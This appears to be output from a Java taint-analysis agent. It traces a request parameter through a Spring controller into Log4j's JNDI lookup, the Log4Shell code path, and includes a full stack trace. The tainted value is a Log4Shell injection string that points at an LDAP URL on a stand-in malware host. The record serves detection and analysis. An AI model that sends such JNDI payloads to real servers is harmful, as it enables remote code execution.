collect location:
    java.lang.Thread.getStackTrace(Thread.java:1559)
    com.mirror.taint.agent.runtime.TaintCollector.print(TaintCollector.java:1056)
    com.mirror.taint.agent.runtime.TaintCollector.printToFile(TaintCollector.java:1024)
    com.mirror.taint.agent.runtime.TaintCollector.collectArgs(TaintCollector.java:192)
    org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java)
    org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
    org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221)
    org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110)
    org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033)
    org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)
    org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)
    org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)
    org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)
    org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344)
    org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)
    org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)
    org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)
    org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)
    org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)
    org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)
    org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)
    org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)
    org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)
    org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)
    org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540)
    org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498)
    org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481)
    org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456)
    org.apache.logging.log4j.core.config.AwaitCompletionReliabilityStrategy.log(AwaitCompletionReliabilityStrategy.java:82)
    org.apache.logging.log4j.core.Logger.log(Logger.java:161)
    org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205)
    org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159)
    org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142)
    org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2017)
    org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)
    org.apache.logging.log4j.spi.AbstractLogger.info(AbstractLogger.java:1320)
    xxx.MainController.index(MainController.java:18)
    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    java.lang.reflect.Method.invoke(Method.java:498)
    org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
    org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150)
    org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117)
    org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895)
    org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808)
    org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)
    org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067)
    org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963)
    org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006)
    org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:655)
    org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:764)
    org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227)
    org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
    org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
    org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
    org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
    org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)
    org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)
    org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
    org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
    org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)
    org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)
    org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
    org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
    org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)
    org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)
    org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
    org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
    org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197)
    org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97)
    org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:540)
    org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135)
    org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
    org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78)
    org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357)
    org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382)
    org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
    org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:895)
    org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1722)
    org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
    org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
    org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
    org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    java.lang.Thread.run(Thread.java:748)
----------------
arg1: { type: java.lang.String, value:ldap://rce.malware.example/a } 
    source: xxx/MainController#index#arg1: { type: java.lang.String, value:${jndi:ldap://rce.malware.example/a} } (10:12:19.263)
        source type: FACADE_REQUEST
        source location:
            xxx.MainController.index(MainController.java)
        source trace:
            com.mirror.taint.agent.model.StackFrame.preVisitInvokeInsn(StackFrame.java:1033)
                java.lang.StringBuilder@append(Ljava/lang/String;)Ljava/lang/StringBuilder;##arg1: ${jndi:ldap://rce.malware.example/a}, java.lang.String -> java.lang.StringBuilder
            com.mirror.taint.agent.model.StackFrame.preVisitInvokeInsn(StackFrame.java:1033)
                java.lang.StringBuilder@toString()Ljava/lang/String;##this: Received a request for API version ${jndi:ldap://rce.malware.example/a}, java.lang.StringBuilder -> java.lang.String
            org.apache.logging.log4j.message.SimpleMessage.formatTo(SimpleMessage.java:70)
                StringBuilder##append, String -> StringBuilder
            org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:130)
                StringBuilder##substring, StringBuilder -> String
            org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:466)
                StringBuilder##new, String -> StringBuilder
            org.apache.logging.log4j.core.lookup.StrSubstitutor.getChars(StrSubstitutor.java:1401)
                StringBuilder##getChars, StringBuilder -> char[]
            org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:975)
                String##new, char[] -> String
            org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:977)
                StringBuilder##new, String -> StringBuilder
            org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:979)
                StringBuilder##toString, StringBuilder -> String
            org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:214)
                String##substring, String -> String
----------------